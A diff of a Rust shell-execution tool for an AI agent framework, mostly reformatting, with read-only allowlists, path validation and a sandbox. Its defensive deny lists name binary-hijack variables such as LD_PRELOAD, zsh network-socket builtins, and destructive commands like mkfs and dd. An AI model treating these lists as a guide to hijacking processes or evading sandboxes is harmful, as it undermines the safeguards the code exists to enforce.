@@ -1,7 +1,9 @@
 use std::collections::HashMap;
 
 use async_trait::async_trait;
-use fastclaw_core::tool::{Tool, ToolKind, ToolParameterSchema, ToolProgressUpdate, ToolResult, ProgressSender};
+use fastclaw_core::tool::{
+    ProgressSender, Tool, ToolKind, ToolParameterSchema, ToolProgressUpdate, ToolResult,
+};
 
 /// Default output truncation limit (raised from 8KB to 64KB to capture more useful output).
 const DEFAULT_MAX_OUTPUT_BYTES: usize = 65536;
@@ -47,7 +49,12 @@ fn truncate_output(s: &str, max_bytes: usize, terminal_file: Option<&str>) -> St
 ///
 /// Inspired by Cursor's approach: long shell output is written to files,
 /// keeping context lean while the agent can search/tail for details.
-fn write_terminal_file(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> Option<String> {
+fn write_terminal_file(
+    command: &str,
+    stdout: &str,
+    stderr: &str,
+    exit_code: i32,
+) -> Option<String> {
     let dir = std::env::temp_dir().join("fastclaw_terminals");
     if std::fs::create_dir_all(&dir).is_err() {
         return None;
@@ -62,13 +69,21 @@ fn write_terminal_file(command: &str, stdout: &str, stderr: &str, exit_code: i32
     let mut content = String::new();
     content.push_str(&format!("--- command: {} ---\n", command));
     content.push_str(&format!("--- exit_code: {} ---\n", exit_code));
-    content.push_str(&format!("--- stdout ({} lines, {} bytes) ---\n", stdout.lines().count(), stdout.len()));
+    content.push_str(&format!(
+        "--- stdout ({} lines, {} bytes) ---\n",
+        stdout.lines().count(),
+        stdout.len()
+    ));
     content.push_str(stdout);
     if !stdout.ends_with('\n') && !stdout.is_empty() {
         content.push('\n');
     }
     if !stderr.is_empty() {
-        content.push_str(&format!("--- stderr ({} lines, {} bytes) ---\n", stderr.lines().count(), stderr.len()));
+        content.push_str(&format!(
+            "--- stderr ({} lines, {} bytes) ---\n",
+            stderr.lines().count(),
+            stderr.len()
+        ));
         content.push_str(stderr);
         if !stderr.ends_with('\n') {
             content.push('\n');
@@ -91,11 +106,19 @@ fn compact_shell_summary(stdout: &str, stderr: &str, exit_code: i32, file_path: 
     let total_bytes = stdout.len() + stderr.len();
 
     let mut summary = String::new();
-    summary.push_str(&format!("exit_code={exit_code}, {total_lines} lines, {total_bytes} bytes\n"));
+    summary.push_str(&format!(
+        "exit_code={exit_code}, {total_lines} lines, {total_bytes} bytes\n"
+    ));
 
     let tail_count = 15;
     if !stderr.is_empty() && exit_code != 0 {
-        let tail: Vec<&str> = stderr_lines.iter().rev().take(tail_count).rev().copied().collect();
+        let tail: Vec<&str> = stderr_lines
+            .iter()
+            .rev()
+            .take(tail_count)
+            .rev()
+            .copied()
+            .collect();
         summary.push_str("stderr (last lines):\n");
         for line in tail {
             summary.push_str(line);
@@ -103,7 +126,13 @@ fn compact_shell_summary(stdout: &str, stderr: &str, exit_code: i32, file_path: 
         }
     }
     if !stdout.is_empty() {
-        let tail: Vec<&str> = stdout_lines.iter().rev().take(tail_count).rev().copied().collect();
+        let tail: Vec<&str> = stdout_lines
+            .iter()
+            .rev()
+            .take(tail_count)
+            .rev()
+            .copied()
+            .collect();
         summary.push_str("stdout (last lines):\n");
         for line in tail {
             summary.push_str(line);
@@ -119,7 +148,12 @@ fn compact_shell_summary(stdout: &str, stderr: &str, exit_code: i32, file_path: 
 
 /// Process shell output: if large, write to file and return compact summary;
 /// otherwise return the full output inline.
-fn process_shell_output(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> (String, Option<String>) {
+fn process_shell_output(
+    command: &str,
+    stdout: &str,
+    stderr: &str,
+    exit_code: i32,
+) -> (String, Option<String>) {
     let combined_size = stdout.len() + stderr.len();
 
     if combined_size <= TERMINAL_FILE_THRESHOLD {
@@ -503,7 +537,9 @@ After starting a background command:
 
 #[async_trait]
 impl Tool for ShellTool {
-    fn kind(&self) -> ToolKind { ToolKind::Execute }
+    fn kind(&self) -> ToolKind {
+        ToolKind::Execute
+    }
     fn name(&self) -> &str {
         "shell_exec"
     }
@@ -529,19 +565,19 @@ impl Tool for ShellTool {
         shell_parameter_schema(true)
     }
 
-    fn supports_progress(&self) -> bool { true }
+    fn supports_progress(&self) -> bool {
+        true
+    }
 
-    fn max_result_size_chars(&self) -> usize { 30_000 }
+    fn max_result_size_chars(&self) -> usize {
+        30_000
+    }
 
     async fn execute(&self, arguments: &str) -> ToolResult {
         self.execute_shell(arguments, None).await
     }
 
-    async fn execute_with_progress(
-        &self,
-        arguments: &str,
-        progress: ProgressSender,
-    ) -> ToolResult {
+    async fn execute_with_progress(&self, arguments: &str, progress: ProgressSender) -> ToolResult {
         self.execute_shell(arguments, Some(progress)).await
     }
 }
@@ -558,11 +594,13 @@ impl ShellTool {
 
         let command = match args.get("command").and_then(|v| v.as_str()) {
             Some(s) => s,
-            None => return ToolResult::err(
-                "shell_exec is missing string field 'command'. \
+            None => {
+                return ToolResult::err(
+                    "shell_exec is missing string field 'command'. \
                  Example: {\"command\": \"ls -la\", \"is_background\": false}."
-                    .to_string(),
-            ),
+                        .to_string(),
+                )
+            }
         };
 
         let is_background = args
@@ -610,7 +648,10 @@ impl ShellTool {
             match cmd.spawn() {
                 Ok(mut child) => {
                     let pid = child.id();
-                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
+                    let desc = args
+                        .get("description")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or(command);
                     let cmd_for_log = command.to_string();
                     tokio::spawn(async move {
                         match child.wait().await {
@@ -639,7 +680,8 @@ impl ShellTool {
                 Err(e) => ToolResult::err(format!("shell_exec spawn failed: {e}")),
             }
         } else if progress.is_some() {
-            self.execute_with_streaming(cmd, command, timeout, progress.unwrap()).await
+            self.execute_with_streaming(cmd, command, timeout, progress.unwrap())
+                .await
         } else {
             match tokio::time::timeout(timeout, cmd.output()).await {
                 Ok(Ok(output)) => {
@@ -647,7 +689,8 @@ impl ShellTool {
                     let stderr = String::from_utf8_lossy(&output.stderr);
                     let code = output.status.code().unwrap_or(-1);
 
-                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);
+                    let (llm_out, terminal_file) =
+                        process_shell_output(command, &stdout, &stderr, code);
 
                     let tf_ref = terminal_file.as_deref();
                     let full_display = serde_json::json!({
@@ -655,7 +698,8 @@ impl ShellTool {
                         "stdout": truncate_output(&stdout, DEFAULT_MAX_OUTPUT_BYTES, tf_ref),
                         "stderr": truncate_output(&stderr, DEFAULT_MAX_OUTPUT_BYTES, tf_ref),
                         "terminal_file": terminal_file,
-                    }).to_string();
+                    })
+                    .to_string();
 
                     if code == 0 {
                         ToolResult::ok_split(llm_out, full_display)
@@ -663,9 +707,7 @@ impl ShellTool {
                         ToolResult::err(llm_out)
                     }
                 }
-                Ok(Err(e)) => ToolResult::err(format!(
-                    "shell_exec spawn failed: {e}"
-                )),
+                Ok(Err(e)) => ToolResult::err(format!("shell_exec spawn failed: {e}")),
                 Err(_) => ToolResult::err(format!(
                     "shell_exec timed out after {}s, command killed.",
                     self.timeout_secs
@@ -700,14 +742,22 @@ impl ShellTool {
                     lines.push(line.clone());
                     let count = lines.len();
                     if count % 10 == 0 || count <= 5 {
-                        let _ = progress_clone.send(ToolProgressUpdate {
-                            message: format!("stdout: {} lines", count),
-                            progress: None,
-                            partial_output: Some(
-                                lines.iter().rev().take(5).rev()
-                                    .cloned().collect::<Vec<_>>().join("\n")
-                            ),
-                        }).await;
+                        let _ = progress_clone
+                            .send(ToolProgressUpdate {
+                                message: format!("stdout: {} lines", count),
+                                progress: None,
+                                partial_output: Some(
+                                    lines
+                                        .iter()
+                                        .rev()
+                                        .take(5)
+                                        .rev()
+                                        .cloned()
+                                        .collect::<Vec<_>>()
+                                        .join("\n"),
+                                ),
+                            })
+                            .await;
                     }
                 }
             }
@@ -730,20 +780,24 @@ impl ShellTool {
             let stderr_out = stderr_task.await.unwrap_or_default();
             let status = child.wait().await;
             (stdout_out, stderr_out, status)
-        }).await;
+        })
+        .await;
 
         match wait_result {
             Ok((stdout_out, stderr_out, Ok(status))) => {
                 let code = status.code().unwrap_or(-1);
                 let total_lines = stdout_out.lines().count() + stderr_out.lines().count();
 
-                let _ = progress.send(ToolProgressUpdate {
-                    message: format!("completed: exit_code={code}, {total_lines} total lines"),
-                    progress: Some(1.0),
-                    partial_output: None,
-                }).await;
+                let _ = progress
+                    .send(ToolProgressUpdate {
+                        message: format!("completed: exit_code={code}, {total_lines} total lines"),
+                        progress: Some(1.0),
+                        partial_output: None,
+                    })
+                    .await;
 
-                let (llm_out, terminal_file) = process_shell_output(command, &stdout_out, &stderr_out, code);
+                let (llm_out, terminal_file) =
+                    process_shell_output(command, &stdout_out, &stderr_out, code);
 
                 let tf_ref = terminal_file.as_deref();
                 let full_display = serde_json::json!({
@@ -751,7 +805,8 @@ impl ShellTool {
                     "stdout": truncate_output(&stdout_out, DEFAULT_MAX_OUTPUT_BYTES, tf_ref),
                     "stderr": truncate_output(&stderr_out, DEFAULT_MAX_OUTPUT_BYTES, tf_ref),
                     "terminal_file": terminal_file,
-                }).to_string();
+                })
+                .to_string();
 
                 if code == 0 {
                     ToolResult::ok_split(llm_out, full_display)
@@ -789,65 +844,76 @@ const INJECTION_PATTERNS: &[(&str, &str)] = &[
 /// These commands only read information and do not modify state.
 const READONLY_COMMANDS: &[&str] = &[
     // File inspection
-    "ls", "ll", "la", "dir", "exa", "eza", "lsd",
-    "cat", "bat", "head", "tail", "less", "more",
-    "wc", "file", "stat", "du", "df",
-    // Search
-    "grep", "rg", "ag", "ack", "fgrep", "egrep",
-    "find", "fd", "fdfind", "locate", "which", "whereis", "type",
-    // Text processing (readonly)
-    "sort", "uniq", "tr", "cut", "paste", "column",
-    "awk", "sed", // Only readonly when no -i flag (checked separately)
-    "diff", "comm", "cmp",
-    "jq", "yq", "xq",
-    // System info
-    "echo", "printf", "date", "whoami", "hostname", "uname",
-    "env", "printenv", "id", "groups",
-    "ps", "top", "htop", "free", "uptime", "lsof",
-    "pwd", "realpath", "dirname", "basename",
+    "ls", "ll", "la", "dir", "exa", "eza", "lsd", "cat", "bat", "head", "tail", "less", "more",
+    "wc", "file", "stat", "du", "df", // Search
+    "grep", "rg", "ag", "ack", "fgrep", "egrep", "find", "fd", "fdfind", "locate", "which",
+    "whereis", "type", // Text processing (readonly)
+    "sort", "uniq", "tr", "cut", "paste", "column", "awk",
+    "sed", // Only readonly when no -i flag (checked separately)
+    "diff", "comm", "cmp", "jq", "yq", "xq", // System info
+    "echo", "printf", "date", "whoami", "hostname", "uname", "env", "printenv", "id", "groups",
+    "ps", "top", "htop", "free", "uptime", "lsof", "pwd", "realpath", "dirname", "basename",
     // Development tools (read-only subcommands handled separately)
-    "tree", "tokei", "cloc", "scc",
-    "python3", "python", "node", "ruby", // Script execution for queries
+    "tree", "tokei", "cloc", "scc", "python3", "python", "node",
+    "ruby",  // Script execution for queries
     "cargo", // Subcommand checked separately
-    "npm", "npx", "yarn", "pnpm", // Subcommand checked separately
-    "git", // Subcommand checked separately
-    "gh", // Subcommand checked separately
-    "docker", // Subcommand checked separately
+    "npm", "npx", "yarn", "pnpm",    // Subcommand checked separately
+    "git",     // Subcommand checked separately
+    "gh",      // Subcommand checked separately
+    "docker",  // Subcommand checked separately
     "kubectl", // Subcommand checked separately
-    "rustc", "gcc", "g++", "clang", // Compilation is treated as read since it doesn't modify source
-    "make", // Build is read-only from source perspective
-    "test", "[",
-    "true", "false",
-    "sleep",
+    "rustc", "gcc", "g++",
+    "clang", // Compilation is treated as read since it doesn't modify source
+    "make",  // Build is read-only from source perspective
+    "test", "[", "true", "false", "sleep",
     "xargs", // Only safe with readonly sub-commands (checked via pipeline)
 ];
 
 /// Git subcommands that are read-only.
 const GIT_READONLY_SUBCOMMANDS: &[&str] = &[
-    "status", "log", "diff", "show", "branch", "tag",
-    "describe", "shortlog", "blame", "ls-files", "ls-tree",
-    "rev-parse", "rev-list", "remote", "config",
+    "status",
+    "log",
+    "diff",
+    "show",
+    "branch",
+    "tag",
+    "describe",
+    "shortlog",
+    "blame",
+    "ls-files",
+    "ls-tree",
+    "rev-parse",
+    "rev-list",
+    "remote",
+    "config",
     "stash", // stash list/show are readonly; stash pop/apply are not but common enough
 ];
 
 /// Cargo subcommands that are read-only.
 const CARGO_READONLY_SUBCOMMANDS: &[&str] = &[
-    "check", "clippy", "test", "bench", "doc",
-    "tree", "metadata", "pkgid", "verify-project",
-    "version", "help", "search",
+    "check",
+    "clippy",
+    "test",
+    "bench",
+    "doc",
+    "tree",
+    "metadata",
+    "pkgid",
+    "verify-project",
+    "version",
+    "help",
+    "search",
 ];
 
 /// npm/yarn/pnpm subcommands that are read-only.
 const NPM_READONLY_SUBCOMMANDS: &[&str] = &[
-    "list", "ls", "info", "show", "view", "outdated",
-    "audit", "explain", "why", "help", "version",
+    "list", "ls", "info", "show", "view", "outdated", "audit", "explain", "why", "help", "version",
     "test", "run", // run scripts are common in development
 ];
 
 /// Docker subcommands that are read-only.
 const DOCKER_READONLY_SUBCOMMANDS: &[&str] = &[
-    "ps", "images", "inspect", "logs", "stats", "top",
-    "port", "diff", "history", "version", "info",
+    "ps", "images", "inspect", "logs", "stats", "top", "port", "diff", "history", "version", "info",
 ];
 
 /// Classify whether a single command segment is readonly.
@@ -893,11 +959,14 @@ fn classify_readonly(segment: &str) -> Result<(), String> {
         return Ok(());
     }
 
-    Err(format!("command '{base_cmd}' is not in the read-only allowlist"))
+    Err(format!(
+        "command '{base_cmd}' is not in the read-only allowlist"
+    ))
 }
 
 fn classify_git_readonly(args: &[&str]) -> Result<(), String> {
-    let subcommand = args.iter()
+    let subcommand = args
+        .iter()
         .find(|a| !a.starts_with('-'))
         .copied()
         .unwrap_or("");
@@ -909,8 +978,13 @@ fn classify_git_readonly(args: &[&str]) -> Result<(), String> {
     }
 }
 
-fn classify_subcommand_readonly(args: &[&str], allowed: &[&str], parent: &str) -> Result<(), String> {
-    let subcommand = args.iter()
+fn classify_subcommand_readonly(
+    args: &[&str],
+    allowed: &[&str],
+    parent: &str,
+) -> Result<(), String> {
+    let subcommand = args
+        .iter()
         .find(|a| !a.starts_with('-'))
         .copied()
         .unwrap_or("");
@@ -918,7 +992,9 @@ fn classify_subcommand_readonly(args: &[&str], allowed: &[&str], parent: &str) -
     if subcommand.is_empty() || allowed.contains(&subcommand) {
         Ok(())
     } else {
-        Err(format!("{parent} {subcommand} is not a read-only operation"))
+        Err(format!(
+            "{parent} {subcommand} is not a read-only operation"
+        ))
     }
 }
 
@@ -937,7 +1013,11 @@ fn has_output_redirection(s: &str) -> bool {
                 continue;
             }
             // Skip >( (process substitution)
-            let next = if bytes[i + 1..].first() == Some(&b'>') { i + 2 } else { i + 1 };
+            let next = if bytes[i + 1..].first() == Some(&b'>') {
+                i + 2
+            } else {
+                i + 1
+            };
             if next < len && bytes[next] == b'(' {
                 i = next + 1;
                 continue;
@@ -1000,10 +1080,7 @@ const SENSITIVE_HOME_PATHS: &[&str] = &[
 
 /// Commands known to write/modify files (for which path validation applies).
 const PATH_WRITE_COMMANDS: &[&str] = &[
-    "rm", "rmdir", "mv", "cp", "touch", "mkdir",
-    "chmod", "chown", "chgrp",
-    "ln", "unlink",
-    "tee",
+    "rm", "rmdir", "mv", "cp", "touch", "mkdir", "chmod", "chown", "chgrp", "ln", "unlink", "tee",
 ];
 
 /// Extract file path arguments from a command string for validation.
@@ -1014,7 +1091,11 @@ fn extract_paths_from_command(segment: &str) -> (String, Vec<String>) {
         return (String::new(), Vec::new());
     }
 
-    let base_cmd = tokens[0].rsplit('/').next().unwrap_or(tokens[0]).to_string();
+    let base_cmd = tokens[0]
+        .rsplit('/')
+        .next()
+        .unwrap_or(tokens[0])
+        .to_string();
     let args = &tokens[1..];
 
     let mut paths = Vec::new();
@@ -1121,9 +1202,12 @@ pub fn validate_command_paths(command: &str, allowed_dirs: &[String]) -> Result<
                 std::path::PathBuf::from(cleaned)
             } else {
                 // Relative path — try to resolve it; if allowed_dirs is set use first as base
-                let base = allowed_dirs.first()
+                let base = allowed_dirs
+                    .first()
                     .map(std::path::PathBuf::from)
-                    .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from(".")));
+                    .unwrap_or_else(|| {
+                        std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."))
+                    });
                 base.join(cleaned)
             };
 
@@ -1137,7 +1221,9 @@ pub fn validate_command_paths(command: &str, allowed_dirs: &[String]) -> Result<
                 let canonical = expanded.canonicalize().unwrap_or(expanded.clone());
                 let in_allowed = allowed_dirs.iter().any(|d| {
                     let allowed = std::path::Path::new(d);
-                    let allowed_c = allowed.canonicalize().unwrap_or_else(|_| allowed.to_path_buf());
+                    let allowed_c = allowed
+                        .canonicalize()
+                        .unwrap_or_else(|_| allowed.to_path_buf());
                     canonical.starts_with(&allowed_c)
                 });
                 if !in_allowed {
@@ -1158,14 +1244,16 @@ pub fn validate_command_paths(command: &str, allowed_dirs: &[String]) -> Result<
 /// Environment variables that indicate binary hijack attempts.
 /// These MUST NOT be stripped before rule matching.
 const BINARY_HIJACK_VARS: &[&str] = &[
-    "PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
-    "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
+    "PATH",
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "DYLD_INSERT_LIBRARIES",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_FRAMEWORK_PATH",
 ];
 
 /// Wrapper commands that are safe to strip before permission matching.
-const SAFE_WRAPPERS: &[&str] = &[
-    "timeout", "time", "nice", "nohup", "stdbuf", "env",
-];
+const SAFE_WRAPPERS: &[&str] = &["timeout", "time", "nice", "nohup", "stdbuf", "env"];
 
 /// A parsed permission rule for shell commands.
 #[derive(Debug, Clone, PartialEq)]
@@ -1216,8 +1304,16 @@ fn resolve_escapes(s: &str) -> String {
     while i < bytes.len() {
         if bytes[i] == b'\\' && i + 1 < bytes.len() {
             match bytes[i + 1] {
-                b'*' => { result.push('*'); i += 2; continue; }
-                b'\\' => { result.push('\\'); i += 2; continue; }
+                b'*' => {
+                    result.push('*');
+                    i += 2;
+                    continue;
+                }
+                b'\\' => {
+                    result.push('\\');
+                    i += 2;
+                    continue;
+                }
                 _ => {}
             }
         }
@@ -1302,10 +1398,7 @@ pub fn strip_safe_wrappers(command: &str) -> String {
 
         // Strip safe env vars (not binary-hijack vars)
         while let Some(m) = env_var_re.find(&stripped) {
-            let var_name = stripped[..m.end()]
-                .split('=')
-                .next()
-                .unwrap_or("");
+            let var_name = stripped[..m.end()].split('=').next().unwrap_or("");
             if BINARY_HIJACK_VARS.contains(&var_name) {
                 break;
             }
@@ -1339,7 +1432,10 @@ fn skip_wrapper_args(wrapper: &str, args: &[&str]) -> String {
             let mut i = 0;
             while i < args.len() {
                 let arg = args[i];
-                if arg == "--" { i += 1; break; }
+                if arg == "--" {
+                    i += 1;
+                    break;
+                }
                 if arg.starts_with('-') {
                     // flags like --kill-after, -k, -s with values
                     if matches!(arg, "-k" | "-s" | "--kill-after" | "--signal") {
@@ -1359,10 +1455,17 @@ fn skip_wrapper_args(wrapper: &str, args: &[&str]) -> String {
             let mut i = 0;
             while i < args.len() {
                 let arg = args[i];
-                if arg == "--" { i += 1; break; }
-                if arg == "-n" { i += 2; continue; }
+                if arg == "--" {
+                    i += 1;
+                    break;
+                }
+                if arg == "-n" {
+                    i += 2;
+                    continue;
+                }
                 if arg.starts_with('-') && arg.chars().skip(1).all(|c| c.is_ascii_digit()) {
-                    i += 1; continue;
+                    i += 1;
+                    continue;
                 }
                 break;
             }
@@ -1373,9 +1476,18 @@ fn skip_wrapper_args(wrapper: &str, args: &[&str]) -> String {
             let mut i = 0;
             let env_re = regex::Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap();
             while i < args.len() {
-                if args[i] == "--" { i += 1; break; }
-                if args[i].starts_with('-') { i += 1; continue; }
-                if env_re.is_match(args[i]) { i += 1; continue; }
+                if args[i] == "--" {
+                    i += 1;
+                    break;
+                }
+                if args[i].starts_with('-') {
+                    i += 1;
+                    continue;
+                }
+                if env_re.is_match(args[i]) {
+                    i += 1;
+                    continue;
+                }
                 break;
             }
             args[i..].join(" ")
@@ -1453,8 +1565,10 @@ pub fn parse_sed_edit(command: &str) -> Option<SedEditInfo> {
             has_in_place = true;
             i += 1;
             // Check for backup suffix (macOS style: -i '' or -i.bak)
-            if i < args.len() && !args[i].starts_with('-') &&
-               (args[i].is_empty() || args[i].starts_with('.')) {
+            if i < args.len()
+                && !args[i].starts_with('-')
+                && (args[i].is_empty() || args[i].starts_with('.'))
+            {
                 i += 1; // skip backup suffix
             }
             continue;
@@ -1474,7 +1588,9 @@ pub fn parse_sed_edit(command: &str) -> Option<SedEditInfo> {
         // Expression flag
         if arg == "-e" || arg == "--expression" {
             if i + 1 < args.len() {
-                if expression.is_some() { return None; } // multiple expressions not supported
+                if expression.is_some() {
+                    return None;
+                } // multiple expressions not supported
                 expression = Some(args[i + 1]);
                 i += 2;
                 continue;
@@ -1577,12 +1693,8 @@ fn parse_substitution_expr(expr: &str) -> Option<(String, String, String)> {
 
 /// Generate an EditFileTool suggestion from a parsed sed command.
 pub fn sed_to_edit_suggestion(info: &SedEditInfo) -> String {
-    let escaped_pattern = info.pattern
-        .replace('\\', "\\\\")
-        .replace('/', "\\/");
-    let escaped_replacement = info.replacement
-        .replace('\\', "\\\\")
-        .replace('/', "\\/");
+    let escaped_pattern = info.pattern.replace('\\', "\\\\").replace('/', "\\/");
+    let escaped_replacement = info.replacement.replace('\\', "\\\\").replace('/', "\\/");
 
     format!(
         "Instead of sed -i, use the edit_file tool for safer file editing:\n\
@@ -1606,9 +1718,7 @@ pub fn sed_to_edit_suggestion(info: &SedEditInfo) -> String {
 
 /// Zsh-specific dangerous commands that can bypass shell security.
 const ZSH_DANGEROUS_COMMANDS: &[&str] = &[
-    "zmodload", "emulate",
-    "sysopen", "sysread", "syswrite", "sysseek",
-    "zpty", "ztcp", "zsocket",
+    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
     "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
 ];
 
@@ -1785,7 +1895,11 @@ impl SandboxedShellTool {
     /// Build the namespace-isolated command using unshare + bind mounts.
     /// Returns None if namespace isolation is not available (graceful degradation).
     #[cfg(not(windows))]
-    fn build_namespace_command(&self, command: &str, shell: &str) -> Option<tokio::process::Command> {
+    fn build_namespace_command(
+        &self,
+        command: &str,
+        shell: &str,
+    ) -> Option<tokio::process::Command> {
         if !self.config.use_namespace {
             return None;
         }
@@ -1862,15 +1976,13 @@ impl SandboxedShellTool {
     fn validate_command(&self, command: &str) -> Result<(), String> {
         let trimmed = command.trim();
         if trimmed.is_empty() {
-            return Err(
-                "Sandbox shell command is empty after trimming whitespace. \
+            return Err("Sandbox shell command is empty after trimming whitespace. \
                  Provide a non-empty sh -c snippet, e.g. {\"command\": \"echo ok\"}."
-                    .into(),
-            );
+                .into());
         }
 
         // 1. Injection detection via ShellSecurityChecker (replaces old validate_injection_patterns)
-        use super::shell_security::{ShellSecurityChecker, SecurityVerdict};
+        use super::shell_security::{SecurityVerdict, ShellSecurityChecker};
         match ShellSecurityChecker::check(trimmed) {
             SecurityVerdict::Blocked { reason, .. } => {
                 return Err(format!(
@@ -1888,7 +2000,11 @@ impl SandboxedShellTool {
         // 2. Path validation via PathValidator
         use super::shell_path_validation::{PathValidator, PathVerdict};
         let path_validator = PathValidator::new(
-            self.config.allowed_dirs.iter().map(std::path::PathBuf::from).collect()
+            self.config
+                .allowed_dirs
+                .iter()
+                .map(std::path::PathBuf::from)
+                .collect(),
         );
         if let PathVerdict::Blocked { reason, .. } = path_validator.validate(trimmed) {
             return Err(format!(
@@ -1908,14 +2024,15 @@ impl SandboxedShellTool {
         let base_cmd = first_token.rsplit('/').next().unwrap_or(first_token);
 
         if !self.config.allowed_commands.is_empty()
-            && !self.config.allowed_commands.iter().any(|c| c == base_cmd) {
-                return Err(format!(
+            && !self.config.allowed_commands.iter().any(|c| c == base_cmd)
+        {
+            return Err(format!(
                     "Sandbox allowlist rejects first command '{base_cmd}'. \
                      Allowed base commands: {}. \
                      Rewrite the pipeline using only those binaries, or ask the operator to widen allowed_commands.",
                     self.config.allowed_commands.join(", ")
                 ));
-            }
+        }
 
         if self.config.denied_commands.iter().any(|c| c == base_cmd) {
             return Err(format!(
@@ -1986,12 +2103,10 @@ impl SandboxedShellTool {
         }
 
         if contains_unescaped_backticks(&unquoted) {
-            return Err(
-                "Sandbox blocks backtick command substitution. \
+            return Err("Sandbox blocks backtick command substitution. \
                  Use $() syntax inside single-quotes if you need literal backticks for display, \
                  or restructure the command to avoid embedded execution."
-                    .into(),
-            );
+                .into());
         }
 
         Ok(())
@@ -2011,7 +2126,9 @@ impl SandboxedShellTool {
             })?;
         let is_allowed = self.config.allowed_dirs.iter().any(|d| {
             let allowed = std::path::Path::new(d.as_str());
-            let allowed_canonical = allowed.canonicalize().unwrap_or_else(|_| allowed.to_path_buf());
+            let allowed_canonical = allowed
+                .canonicalize()
+                .unwrap_or_else(|_| allowed.to_path_buf());
             canonical.starts_with(&allowed_canonical)
         });
         if is_allowed {
@@ -2028,12 +2145,16 @@ impl SandboxedShellTool {
 
 #[async_trait]
 impl Tool for SandboxedShellTool {
-    fn kind(&self) -> ToolKind { ToolKind::Execute }
+    fn kind(&self) -> ToolKind {
+        ToolKind::Execute
+    }
     fn name(&self) -> &str {
         "shell_exec"
     }
 
-    fn max_result_size_chars(&self) -> usize { 30_000 }
+    fn max_result_size_chars(&self) -> usize {
+        30_000
+    }
 
     fn description(&self) -> &str {
         "Sandboxed shell_exec — commands validated against allow/deny rules before execution. \
@@ -2049,10 +2170,12 @@ impl Tool for SandboxedShellTool {
 
     fn prompt(&self) -> String {
         let mut prompt = SHELL_TOOL_PROMPT.to_string();
-        prompt.push_str("\n\n## Command Sandbox\n\n\
+        prompt.push_str(
+            "\n\n## Command Sandbox\n\n\
 By default, your command will be run in a sandbox. This sandbox controls \
 which directories and network hosts commands may access or modify.\n\n\
-Sandbox restrictions:\n");
+Sandbox restrictions:\n",
+        );
 
         if !self.config.allowed_dirs.is_empty() {
             prompt.push_str(&format!(
@@ -2067,12 +2190,14 @@ Sandbox restrictions:\n");
             ));
         }
 
-        prompt.push_str("\n\
+        prompt.push_str(
+            "\n\
 - Commands validated against allow/deny rules before execution\n\
 - Blocked commands (sudo, su, mkfs, dd, fdisk, etc.) return SANDBOX BLOCKED\n\
 - For temporary files, use the `$TMPDIR` environment variable — do NOT use `/tmp` directly\n\
 - If a command fails due to sandbox restrictions, work with the user to adjust sandbox settings\n\
-- Do NOT attempt to bypass the sandbox");
+- Do NOT attempt to bypass the sandbox",
+        );
 
         prompt
     }
@@ -2092,11 +2217,13 @@ Sandbox restrictions:\n");
 
         let command = match args.get("command").and_then(|v| v.as_str()) {
             Some(s) => s,
-            None => return ToolResult::err(
-                "sandboxed shell_exec is missing string field 'command'. \
+            None => {
+                return ToolResult::err(
+                    "sandboxed shell_exec is missing string field 'command'. \
                  Example: {\"command\": \"echo ok\", \"is_background\": false}."
-                    .to_string(),
-            ),
+                        .to_string(),
+                )
+            }
         };
 
         let is_background = args
@@ -2121,9 +2248,7 @@ Sandbox restrictions:\n");
         // Detect sed -i and suggest EditFileTool instead
         if let Some(sed_info) = parse_sed_edit(command) {
             let suggestion = sed_to_edit_suggestion(&sed_info);
-            return ToolResult::err(format!(
-                "SANDBOX SUGGESTION: sed -i detected. {suggestion}"
-            ));
+            return ToolResult::err(format!("SANDBOX SUGGESTION: sed -i detected. {suggestion}"));
         }
 
         let user_confirmed = args
@@ -2192,7 +2317,10 @@ Sandbox restrictions:\n");
             match cmd.spawn() {
                 Ok(child) => {
                     let pid = child.id();
-                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
+                    let desc = args
+                        .get("description")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or(command);
                     ToolResult::ok(
                         serde_json::json!({
                             "background": true,
@@ -2221,7 +2349,8 @@ Sandbox restrictions:\n");
                     #[cfg(not(unix))]
                     let signal: Option<i32> = None;
 
-                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);
+                    let (llm_out, terminal_file) =
+                        process_shell_output(command, &stdout, &stderr, code);
 
                     let tf_ref = terminal_file.as_deref();
                     let full_display = serde_json::json!({
@@ -2231,7 +2360,8 @@ Sandbox restrictions:\n");
                         "signal": signal,
                         "sandboxed": true,
                         "terminal_file": terminal_file,
-                    }).to_string();
+                    })
+                    .to_string();
 
                     if code == 0 {
                         ToolResult::ok_split(llm_out, full_display)
@@ -2239,9 +2369,7 @@ Sandbox restrictions:\n");
                         ToolResult::err(llm_out)
                     }
                 }
-                Ok(Err(e)) => ToolResult::err(format!(
-                    "sandboxed shell_exec spawn failed: {e}"
-                )),
+                Ok(Err(e)) => ToolResult::err(format!("sandboxed shell_exec spawn failed: {e}")),
                 Err(_) => ToolResult::err(format!(
                     "sandboxed shell_exec timed out after {}s, command killed.",
                     self.config.timeout_secs
@@ -2325,14 +2453,17 @@ mod sandbox_tests {
     #[tokio::test]
     async fn executes_safe_command() {
         let tool = default_sandbox();
-        let result = tool.execute(r#"{"command": "echo sandbox_test", "is_background": false}"#).await;
+        let result = tool
+            .execute(r#"{"command": "echo sandbox_test", "is_background": false}"#)
+            .await;
         assert!(result.success, "command should succeed: {}", result.output);
         assert!(result.output.contains("sandbox_test"));
         // "sandboxed" flag is in display_output (richer UI representation)
         if let Some(ref display) = result.display_output {
             assert!(
